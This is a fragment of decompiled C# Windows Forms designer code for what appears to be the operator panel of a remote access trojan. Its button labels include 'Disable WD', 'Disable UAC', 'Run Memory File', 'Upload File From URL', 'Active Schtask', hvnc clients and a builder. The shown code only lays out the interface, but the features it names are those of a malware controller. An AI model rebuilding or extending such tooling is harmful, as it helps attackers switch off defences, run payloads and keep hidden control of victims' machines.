			this.siticoneGradientButton2.BorderRadius = 1;
			this.siticoneGradientButton2.BorderThickness = 1;
			this.siticoneGradientButton2.CheckedState.Parent = this.siticoneGradientButton2;
			this.siticoneGradientButton2.CustomImages.Parent = this.siticoneGradientButton2;
			this.siticoneGradientButton2.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.siticoneGradientButton2.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.siticoneGradientButton2.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.siticoneGradientButton2.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.siticoneGradientButton2.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.siticoneGradientButton2.DisabledState.Parent = this.siticoneGradientButton2;
			this.siticoneGradientButton2.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneGradientButton2.FillColor2 = global::System.Drawing.Color.Transparent;
			this.siticoneGradientButton2.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.siticoneGradientButton2.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.siticoneGradientButton2.HoverState.Parent = this.siticoneGradientButton2;
			this.siticoneGradientButton2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("siticoneGradientButton2.Image");
			this.siticoneGradientButton2.Location = new global::System.Drawing.Point(1293, 0);
			this.siticoneGradientButton2.Name = "siticoneGradientButton2";
			this.siticoneGradientButton2.ShadowDecoration.Parent = this.siticoneGradientButton2;
			this.siticoneGradientButton2.Size = new global::System.Drawing.Size(121, 24);
			this.siticoneGradientButton2.TabIndex = 11;
			this.siticoneGradientButton2.Text = "Start Thumbnail";
			this.siticoneGradientButton2.Click += new global::System.EventHandler(this.STARTToolStripMenuItem_Click);
			this.siticoneGradientButton9.BackColor = global::System.Drawing.Color.Transparent;
			this.siticoneGradientButton9.BorderColor = global::System.Drawing.Color.Transparent;
			this.siticoneGradientButton9.BorderRadius = 1;
			this.siticoneGradientButton9.BorderThickness = 1;
			this.siticoneGradientButton9.CheckedState.Parent = this.siticoneGradientButton9;
			this.siticoneGradientButton9.CustomImages.Parent = this.siticoneGradientButton9;
			this.siticoneGradientButton9.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.siticoneGradientButton9.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.siticoneGradientButton9.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.siticoneGradientButton9.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.siticoneGradientButton9.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.siticoneGradientButton9.DisabledState.Parent = this.siticoneGradientButton9;
			this.siticoneGradientButton9.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneGradientButton9.FillColor2 = global::System.Drawing.Color.Transparent;
			this.siticoneGradientButton9.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.siticoneGradientButton9.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.siticoneGradientButton9.HoverState.Parent = this.siticoneGradientButton9;
			this.siticoneGradientButton9.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("siticoneGradientButton9.Image");
			this.siticoneGradientButton9.Location = new global::System.Drawing.Point(1415, 0);
			this.siticoneGradientButton9.Name = "siticoneGradientButton9";
			this.siticoneGradientButton9.ShadowDecoration.Parent = this.siticoneGradientButton9;
			this.siticoneGradientButton9.Size = new global::System.Drawing.Size(121, 24);
			this.siticoneGradientButton9.TabIndex = 12;
			this.siticoneGradientButton9.Text = "Stop Thumbnail";
			this.siticoneGradientButton9.Click += new global::System.EventHandler(this.STOPToolStripMenuItem_Click);
			this.siticoneGradientPanel5.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel5.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.siticoneGradientPanel5.FillColor = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel5.FillColor2 = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel5.Location = new global::System.Drawing.Point(3, 614);
			this.siticoneGradientPanel5.Name = "siticoneGradientPanel5";
			this.siticoneGradientPanel5.ShadowDecoration.Parent = this.siticoneGradientPanel5;
			this.siticoneGradientPanel5.Size = new global::System.Drawing.Size(1546, 24);
			this.siticoneGradientPanel5.TabIndex = 127;
			this.tabPage4.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.tabPage4.Controls.Add(this.listView4);
			this.tabPage4.Controls.Add(this.siticoneGradientPanel3);
			this.tabPage4.ImageIndex = 2;
			this.tabPage4.Location = new global::System.Drawing.Point(4, 44);
			this.tabPage4.Name = "tabPage4";
			this.tabPage4.Padding = new global::System.Windows.Forms.Padding(3);
			this.tabPage4.Size = new global::System.Drawing.Size(1552, 641);
			this.tabPage4.TabIndex = 3;
			this.tabPage4.Text = "Automatically Task";
			this.siticoneGradientPanel3.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel3.Controls.Add(this.uPDATEToolStripMenuItem1);
			this.siticoneGradientPanel3.Controls.Add(this.sendFileFromUrlToolStripMenuItem);
			this.siticoneGradientPanel3.Controls.Add(this.disableWDToolStripMenuItem1);
			this.siticoneGradientPanel3.Controls.Add(this.downloadAndExecuteToolStripMenuItem);
			this.siticoneGradientPanel3.Controls.Add(this.disableUACToolStripMenuItem1);
			this.siticoneGradientPanel3.Controls.Add(this.sENDFILETOMEMORYToolStripMenuItem1);
			this.siticoneGradientPanel3.Controls.Add(this.installSchtaskToolStripMenuItem);
			this.siticoneGradientPanel3.Controls.Add(this.dELETETASKToolStripMenuItem);
			this.siticoneGradientPanel3.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.siticoneGradientPanel3.FillColor = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel3.FillColor2 = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel3.Location = new global::System.Drawing.Point(3, 614);
			this.siticoneGradientPanel3.Name = "siticoneGradientPanel3";
			this.siticoneGradientPanel3.ShadowDecoration.Parent = this.siticoneGradientPanel3;
			this.siticoneGradientPanel3.Size = new global::System.Drawing.Size(1546, 24);
			this.siticoneGradientPanel3.TabIndex = 126;
			this.uPDATEToolStripMenuItem1.BackColor = global::System.Drawing.Color.Transparent;
			this.uPDATEToolStripMenuItem1.BorderColor = global::System.Drawing.Color.Transparent;
			this.uPDATEToolStripMenuItem1.BorderRadius = 1;
			this.uPDATEToolStripMenuItem1.BorderThickness = 1;
			this.uPDATEToolStripMenuItem1.CheckedState.Parent = this.uPDATEToolStripMenuItem1;
			this.uPDATEToolStripMenuItem1.CustomImages.Parent = this.uPDATEToolStripMenuItem1;
			this.uPDATEToolStripMenuItem1.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.uPDATEToolStripMenuItem1.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.uPDATEToolStripMenuItem1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.uPDATEToolStripMenuItem1.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.uPDATEToolStripMenuItem1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.uPDATEToolStripMenuItem1.DisabledState.Parent = this.uPDATEToolStripMenuItem1;
			this.uPDATEToolStripMenuItem1.FillColor = global::System.Drawing.Color.Transparent;
			this.uPDATEToolStripMenuItem1.FillColor2 = global::System.Drawing.Color.Transparent;
			this.uPDATEToolStripMenuItem1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.uPDATEToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.uPDATEToolStripMenuItem1.HoverState.Parent = this.uPDATEToolStripMenuItem1;
			this.uPDATEToolStripMenuItem1.Location = new global::System.Drawing.Point(256, 0);
			this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
			this.uPDATEToolStripMenuItem1.ShadowDecoration.Parent = this.uPDATEToolStripMenuItem1;
			this.uPDATEToolStripMenuItem1.Size = new global::System.Drawing.Size(121, 24);
			this.uPDATEToolStripMenuItem1.TabIndex = 11;
			this.uPDATEToolStripMenuItem1.Text = "Update all Clients";
			this.uPDATEToolStripMenuItem1.Click += new global::System.EventHandler(this.UPDATEToolStripMenuItem1_Click);
			this.sendFileFromUrlToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.sendFileFromUrlToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.sendFileFromUrlToolStripMenuItem.BorderRadius = 1;
			this.sendFileFromUrlToolStripMenuItem.BorderThickness = 1;
			this.sendFileFromUrlToolStripMenuItem.CheckedState.Parent = this.sendFileFromUrlToolStripMenuItem;
			this.sendFileFromUrlToolStripMenuItem.CustomImages.Parent = this.sendFileFromUrlToolStripMenuItem;
			this.sendFileFromUrlToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.sendFileFromUrlToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.sendFileFromUrlToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.sendFileFromUrlToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.sendFileFromUrlToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.sendFileFromUrlToolStripMenuItem.DisabledState.Parent = this.sendFileFromUrlToolStripMenuItem;
			this.sendFileFromUrlToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.sendFileFromUrlToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.sendFileFromUrlToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.sendFileFromUrlToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.sendFileFromUrlToolStripMenuItem.HoverState.Parent = this.sendFileFromUrlToolStripMenuItem;
			this.sendFileFromUrlToolStripMenuItem.Location = new global::System.Drawing.Point(383, 0);
			this.sendFileFromUrlToolStripMenuItem.Name = "sendFileFromUrlToolStripMenuItem";
			this.sendFileFromUrlToolStripMenuItem.ShadowDecoration.Parent = this.sendFileFromUrlToolStripMenuItem;
			this.sendFileFromUrlToolStripMenuItem.Size = new global::System.Drawing.Size(147, 24);
			this.sendFileFromUrlToolStripMenuItem.TabIndex = 12;
			this.sendFileFromUrlToolStripMenuItem.Text = "Upload File From URL";
			this.sendFileFromUrlToolStripMenuItem.Click += new global::System.EventHandler(this.sendFileFromUrlToolStripMenuItem_Click);
			this.disableWDToolStripMenuItem1.BackColor = global::System.Drawing.Color.Transparent;
			this.disableWDToolStripMenuItem1.BorderColor = global::System.Drawing.Color.Transparent;
			this.disableWDToolStripMenuItem1.BorderRadius = 1;
			this.disableWDToolStripMenuItem1.BorderThickness = 1;
			this.disableWDToolStripMenuItem1.CheckedState.Parent = this.disableWDToolStripMenuItem1;
			this.disableWDToolStripMenuItem1.CustomImages.Parent = this.disableWDToolStripMenuItem1;
			this.disableWDToolStripMenuItem1.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.disableWDToolStripMenuItem1.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.disableWDToolStripMenuItem1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.disableWDToolStripMenuItem1.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.disableWDToolStripMenuItem1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.disableWDToolStripMenuItem1.DisabledState.Parent = this.disableWDToolStripMenuItem1;
			this.disableWDToolStripMenuItem1.FillColor = global::System.Drawing.Color.Transparent;
			this.disableWDToolStripMenuItem1.FillColor2 = global::System.Drawing.Color.Transparent;
			this.disableWDToolStripMenuItem1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.disableWDToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.disableWDToolStripMenuItem1.HoverState.Parent = this.disableWDToolStripMenuItem1;
			this.disableWDToolStripMenuItem1.Location = new global::System.Drawing.Point(790, 0);
			this.disableWDToolStripMenuItem1.Name = "disableWDToolStripMenuItem1";
			this.disableWDToolStripMenuItem1.ShadowDecoration.Parent = this.disableWDToolStripMenuItem1;
			this.disableWDToolStripMenuItem1.Size = new global::System.Drawing.Size(121, 24);
			this.disableWDToolStripMenuItem1.TabIndex = 11;
			this.disableWDToolStripMenuItem1.Text = "Disable WD";
			this.disableWDToolStripMenuItem1.Click += new global::System.EventHandler(this.disableWDToolStripMenuItem1_Click);
			this.downloadAndExecuteToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.downloadAndExecuteToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.downloadAndExecuteToolStripMenuItem.BorderRadius = 1;
			this.downloadAndExecuteToolStripMenuItem.BorderThickness = 1;
			this.downloadAndExecuteToolStripMenuItem.CheckedState.Parent = this.downloadAndExecuteToolStripMenuItem;
			this.downloadAndExecuteToolStripMenuItem.CustomImages.Parent = this.downloadAndExecuteToolStripMenuItem;
			this.downloadAndExecuteToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.downloadAndExecuteToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.downloadAndExecuteToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.downloadAndExecuteToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.downloadAndExecuteToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.downloadAndExecuteToolStripMenuItem.DisabledState.Parent = this.downloadAndExecuteToolStripMenuItem;
			this.downloadAndExecuteToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.downloadAndExecuteToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.downloadAndExecuteToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.downloadAndExecuteToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.downloadAndExecuteToolStripMenuItem.HoverState.Parent = this.downloadAndExecuteToolStripMenuItem;
			this.downloadAndExecuteToolStripMenuItem.Location = new global::System.Drawing.Point(536, 0);
			this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
			this.downloadAndExecuteToolStripMenuItem.ShadowDecoration.Parent = this.downloadAndExecuteToolStripMenuItem;
			this.downloadAndExecuteToolStripMenuItem.Size = new global::System.Drawing.Size(121, 24);
			this.downloadAndExecuteToolStripMenuItem.TabIndex = 11;
			this.downloadAndExecuteToolStripMenuItem.Text = "Run Disk File";
			this.downloadAndExecuteToolStripMenuItem.Click += new global::System.EventHandler(this.DownloadAndExecuteToolStripMenuItem_Click);
			this.disableUACToolStripMenuItem1.BackColor = global::System.Drawing.Color.Transparent;
			this.disableUACToolStripMenuItem1.BorderColor = global::System.Drawing.Color.Transparent;
			this.disableUACToolStripMenuItem1.BorderRadius = 1;
			this.disableUACToolStripMenuItem1.BorderThickness = 1;
			this.disableUACToolStripMenuItem1.CheckedState.Parent = this.disableUACToolStripMenuItem1;
			this.disableUACToolStripMenuItem1.CustomImages.Parent = this.disableUACToolStripMenuItem1;
			this.disableUACToolStripMenuItem1.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.disableUACToolStripMenuItem1.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.disableUACToolStripMenuItem1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.disableUACToolStripMenuItem1.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.disableUACToolStripMenuItem1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.disableUACToolStripMenuItem1.DisabledState.Parent = this.disableUACToolStripMenuItem1;
			this.disableUACToolStripMenuItem1.FillColor = global::System.Drawing.Color.Transparent;
			this.disableUACToolStripMenuItem1.FillColor2 = global::System.Drawing.Color.Transparent;
			this.disableUACToolStripMenuItem1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.disableUACToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.disableUACToolStripMenuItem1.HoverState.Parent = this.disableUACToolStripMenuItem1;
			this.disableUACToolStripMenuItem1.Location = new global::System.Drawing.Point(917, 0);
			this.disableUACToolStripMenuItem1.Name = "disableUACToolStripMenuItem1";
			this.disableUACToolStripMenuItem1.ShadowDecoration.Parent = this.disableUACToolStripMenuItem1;
			this.disableUACToolStripMenuItem1.Size = new global::System.Drawing.Size(121, 24);
			this.disableUACToolStripMenuItem1.TabIndex = 12;
			this.disableUACToolStripMenuItem1.Text = "Disable UAC";
			this.disableUACToolStripMenuItem1.Click += new global::System.EventHandler(this.disableUACToolStripMenuItem1_Click);
			this.sENDFILETOMEMORYToolStripMenuItem1.BackColor = global::System.Drawing.Color.Transparent;
			this.sENDFILETOMEMORYToolStripMenuItem1.BorderColor = global::System.Drawing.Color.Transparent;
			this.sENDFILETOMEMORYToolStripMenuItem1.BorderRadius = 1;
			this.sENDFILETOMEMORYToolStripMenuItem1.BorderThickness = 1;
			this.sENDFILETOMEMORYToolStripMenuItem1.CheckedState.Parent = this.sENDFILETOMEMORYToolStripMenuItem1;
			this.sENDFILETOMEMORYToolStripMenuItem1.CustomImages.Parent = this.sENDFILETOMEMORYToolStripMenuItem1;
			this.sENDFILETOMEMORYToolStripMenuItem1.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.sENDFILETOMEMORYToolStripMenuItem1.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.sENDFILETOMEMORYToolStripMenuItem1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.sENDFILETOMEMORYToolStripMenuItem1.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.sENDFILETOMEMORYToolStripMenuItem1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.sENDFILETOMEMORYToolStripMenuItem1.DisabledState.Parent = this.sENDFILETOMEMORYToolStripMenuItem1;
			this.sENDFILETOMEMORYToolStripMenuItem1.FillColor = global::System.Drawing.Color.Transparent;
			this.sENDFILETOMEMORYToolStripMenuItem1.FillColor2 = global::System.Drawing.Color.Transparent;
			this.sENDFILETOMEMORYToolStripMenuItem1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.sENDFILETOMEMORYToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.sENDFILETOMEMORYToolStripMenuItem1.HoverState.Parent = this.sENDFILETOMEMORYToolStripMenuItem1;
			this.sENDFILETOMEMORYToolStripMenuItem1.Location = new global::System.Drawing.Point(663, 0);
			this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
			this.sENDFILETOMEMORYToolStripMenuItem1.ShadowDecoration.Parent = this.sENDFILETOMEMORYToolStripMenuItem1;
			this.sENDFILETOMEMORYToolStripMenuItem1.Size = new global::System.Drawing.Size(121, 24);
			this.sENDFILETOMEMORYToolStripMenuItem1.TabIndex = 12;
			this.sENDFILETOMEMORYToolStripMenuItem1.Text = "Run Memory File";
			this.sENDFILETOMEMORYToolStripMenuItem1.Click += new global::System.EventHandler(this.SENDFILETOMEMORYToolStripMenuItem1_Click);
			this.installSchtaskToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.installSchtaskToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.installSchtaskToolStripMenuItem.BorderRadius = 1;
			this.installSchtaskToolStripMenuItem.BorderThickness = 1;
			this.installSchtaskToolStripMenuItem.CheckedState.Parent = this.installSchtaskToolStripMenuItem;
			this.installSchtaskToolStripMenuItem.CustomImages.Parent = this.installSchtaskToolStripMenuItem;
			this.installSchtaskToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.installSchtaskToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.installSchtaskToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.installSchtaskToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.installSchtaskToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.installSchtaskToolStripMenuItem.DisabledState.Parent = this.installSchtaskToolStripMenuItem;
			this.installSchtaskToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.installSchtaskToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.installSchtaskToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.installSchtaskToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.installSchtaskToolStripMenuItem.HoverState.Parent = this.installSchtaskToolStripMenuItem;
			this.installSchtaskToolStripMenuItem.Location = new global::System.Drawing.Point(1044, 0);
			this.installSchtaskToolStripMenuItem.Name = "installSchtaskToolStripMenuItem";
			this.installSchtaskToolStripMenuItem.ShadowDecoration.Parent = this.installSchtaskToolStripMenuItem;
			this.installSchtaskToolStripMenuItem.Size = new global::System.Drawing.Size(121, 24);
			this.installSchtaskToolStripMenuItem.TabIndex = 11;
			this.installSchtaskToolStripMenuItem.Text = "Active Schtask";
			this.installSchtaskToolStripMenuItem.Click += new global::System.EventHandler(this.installSchtaskToolStripMenuItem_Click);
			this.dELETETASKToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.dELETETASKToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.dELETETASKToolStripMenuItem.BorderRadius = 1;
			this.dELETETASKToolStripMenuItem.BorderThickness = 1;
			this.dELETETASKToolStripMenuItem.CheckedState.Parent = this.dELETETASKToolStripMenuItem;
			this.dELETETASKToolStripMenuItem.CustomImages.Parent = this.dELETETASKToolStripMenuItem;
			this.dELETETASKToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.dELETETASKToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.dELETETASKToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.dELETETASKToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.dELETETASKToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.dELETETASKToolStripMenuItem.DisabledState.Parent = this.dELETETASKToolStripMenuItem;
			this.dELETETASKToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.dELETETASKToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.dELETETASKToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.dELETETASKToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.dELETETASKToolStripMenuItem.HoverState.Parent = this.dELETETASKToolStripMenuItem;
			this.dELETETASKToolStripMenuItem.Location = new global::System.Drawing.Point(1171, 0);
			this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
			this.dELETETASKToolStripMenuItem.ShadowDecoration.Parent = this.dELETETASKToolStripMenuItem;
			this.dELETETASKToolStripMenuItem.Size = new global::System.Drawing.Size(121, 24);
			this.dELETETASKToolStripMenuItem.TabIndex = 12;
			this.dELETETASKToolStripMenuItem.Text = "Delete";
			this.dELETETASKToolStripMenuItem.Click += new global::System.EventHandler(this.DELETETASKToolStripMenuItem_Click);
			this.siticoneGradientPanel2.Controls.Add(this.siticoneControlBox3);
			this.siticoneGradientPanel2.Controls.Add(this.siticoneControlBox4);
			this.siticoneGradientPanel2.Controls.Add(this.toolStripStatusLabel1);
			this.siticoneGradientPanel2.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.siticoneGradientPanel2.FillColor = global::System.Drawing.Color.FromArgb(27, 33, 29);
			this.siticoneGradientPanel2.FillColor2 = global::System.Drawing.Color.FromArgb(27, 33, 29);
			this.siticoneGradientPanel2.Location = new global::System.Drawing.Point(0, 758);
			this.siticoneGradientPanel2.Name = "siticoneGradientPanel2";
			this.siticoneGradientPanel2.ShadowDecoration.Parent = this.siticoneGradientPanel2;
			this.siticoneGradientPanel2.Size = new global::System.Drawing.Size(1560, 29);
			this.siticoneGradientPanel2.TabIndex = 14;
			this.siticoneControlBox3.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.siticoneControlBox3.BackColor = global::System.Drawing.Color.Transparent;
			this.siticoneControlBox3.ControlBoxType = 0;
			this.siticoneControlBox3.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneControlBox3.HoverState.Parent = this.siticoneControlBox3;
			this.siticoneControlBox3.IconColor = global::System.Drawing.Color.White;
			this.siticoneControlBox3.Location = new global::System.Drawing.Point(1500, 3);
			this.siticoneControlBox3.Name = "siticoneControlBox3";
			this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
			this.siticoneControlBox3.Size = new global::System.Drawing.Size(25, 21);
			this.siticoneControlBox3.TabIndex = 5;
			this.siticoneControlBox4.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.siticoneControlBox4.BackColor = global::System.Drawing.Color.Transparent;
			this.siticoneControlBox4.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneControlBox4.HoverState.Parent = this.siticoneControlBox4;
			this.siticoneControlBox4.IconColor = global::System.Drawing.Color.White;
			this.siticoneControlBox4.Location = new global::System.Drawing.Point(1531, 3);
			this.siticoneControlBox4.Name = "siticoneControlBox4";
			this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
			this.siticoneControlBox4.Size = new global::System.Drawing.Size(25, 21);
			this.siticoneControlBox4.TabIndex = 5;
			this.toolStripStatusLabel1.AutoSize = true;
			this.toolStripStatusLabel1.BackColor = global::System.Drawing.Color.Transparent;
			this.toolStripStatusLabel1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.toolStripStatusLabel1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.toolStripStatusLabel1.Location = new global::System.Drawing.Point(12, 5);
			this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
			this.toolStripStatusLabel1.Size = new global::System.Drawing.Size(41, 15);
			this.toolStripStatusLabel1.TabIndex = 0;
			this.toolStripStatusLabel1.Text = "label1";
			this.siticoneGradientPanel1.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel1.Controls.Add(this.BtnPMTelegram);
			this.siticoneGradientPanel1.Controls.Add(this.Btnwebsite);
			this.siticoneGradientPanel1.Controls.Add(this.BtnTGgroup);
			this.siticoneGradientPanel1.Controls.Add(this.BtcnhvncClients);
			this.siticoneGradientPanel1.Controls.Add(this.BuilderToolStripMenuItem);
			this.siticoneGradientPanel1.Controls.Add(this.BtnClientFolder);
			this.siticoneGradientPanel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.siticoneGradientPanel1.FillColor = global::System.Drawing.Color.FromArgb(27, 91, 50);
			this.siticoneGradientPanel1.FillColor2 = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel1.Location = new global::System.Drawing.Point(0, 38);
			this.siticoneGradientPanel1.Name = "siticoneGradientPanel1";
			this.siticoneGradientPanel1.ShadowDecoration.Parent = this.siticoneGradientPanel1;
			this.siticoneGradientPanel1.Size = new global::System.Drawing.Size(1560, 31);
			this.siticoneGradientPanel1.TabIndex = 19;
			this.BtnPMTelegram.BackColor = global::System.Drawing.Color.Transparent;
			this.BtnPMTelegram.BorderColor = global::System.Drawing.Color.Transparent;
			this.BtnPMTelegram.BorderRadius = 1;
			this.BtnPMTelegram.BorderThickness = 1;
			this.BtnPMTelegram.CheckedState.Parent = this.BtnPMTelegram;
			this.BtnPMTelegram.CustomImages.Parent = this.BtnPMTelegram;
			this.BtnPMTelegram.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.BtnPMTelegram.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.BtnPMTelegram.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BtnPMTelegram.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.BtnPMTelegram.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.BtnPMTelegram.DisabledState.Parent = this.BtnPMTelegram;
			this.BtnPMTelegram.FillColor = global::System.Drawing.Color.Transparent;
			this.BtnPMTelegram.FillColor2 = global::System.Drawing.Color.Transparent;
			this.BtnPMTelegram.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.BtnPMTelegram.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.BtnPMTelegram.HoverState.Parent = this.BtnPMTelegram;
